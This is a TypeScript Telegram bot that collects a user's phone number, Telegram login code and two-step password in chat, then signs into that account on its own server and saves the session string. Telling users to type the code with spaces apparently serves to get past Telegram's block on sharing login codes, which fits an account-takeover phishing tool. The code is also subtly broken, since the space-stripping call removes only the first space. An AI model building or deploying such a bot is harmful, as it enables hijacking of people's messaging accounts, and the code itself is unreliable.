import { Telegraf, Context, Markup } from "telegraf";
import { Api, TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';

const botToken = process.env.BOT_TOKEN;
const apiId = parseInt(process.env.API_ID ?? "");
const apiHash = process.env.API_HASH;

if (!botToken || !apiId || !apiHash)
    throw new Error(`"BOT_TOKEN", "API_ID" and "API_HASH" environment variables should be defined.`);

const bot = new Telegraf<Context>(botToken );

interface LoginSessionData {
    phoneNumber?: string;
    phoneCodeHash?: string;
    secretCode?: string;
    telegramSession?: string;
}

const sessions: Record<number, LoginSessionData> = {};

bot.start((ctx) => ctx.reply('Welcome! Please send me your phone number.'));

bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    const text = ctx.message.text;

    if (!sessions[chatId]) {
        sessions[chatId] = {};
    }

    const sessionData = sessions[chatId];

    if (!sessionData.phoneNumber) {
        sessionData.phoneNumber = text;

        const session = new StringSession("");
        const client = new TelegramClient(session, apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        
        try {
            const result = await client.sendCode({ apiId, apiHash }, sessionData.phoneNumber);
            
            sessionData.phoneCodeHash = result.phoneCodeHash;
            sessionData.telegramSession = session.save();
            await ctx.reply(`Please enter the code you received from Telegram separated by whitespace (for example, "1 2 3 4 5"):`);
        } 
        catch (e: any) {
            console.error("Error while sending authorization code.", e);
            await ctx.reply(`Failed to send authorization code. Please try again. Error: ${e?.message ?? e}.`);
        }
        finally {
            client.disconnect();
        }
    } else if (!sessionData.secretCode) {
        sessionData.secretCode = text.replace(" ", "");
        await ctx.reply(`Please enter your password (if you don't use it, enter "-"):`);
    } 
    else {
        const session = new StringSession(sessionData.telegramSession);
        const client = new TelegramClient(session, apiId, apiHash, { connectionRetries: 5 });
        await client.connect();

        try {
            await client.signInUser({ apiId, apiHash }, {
                phoneNumber: sessionData.phoneNumber,
                phoneCode: async () => sessionData.secretCode ?? "",
                password: text != "-" ? async () => text : undefined,
                onError: (err) => { throw err }
            });

            sessionData.telegramSession = session.save();
            const me = await client.getMe();
            await ctx.reply(`You are logged in as ${me.firstName} ${me.lastName} (@${me.username})`);
        } 
        catch (err) {
            console.error("Error while sign-in Telegram.", err);
            await ctx.reply('Failed to sign in. Please check your credentials and try again.');
        }
        finally {
            client.disconnect();
        }
        delete sessions[chatId];
    }
});

bot.launch();

console.log("Bot is running...");
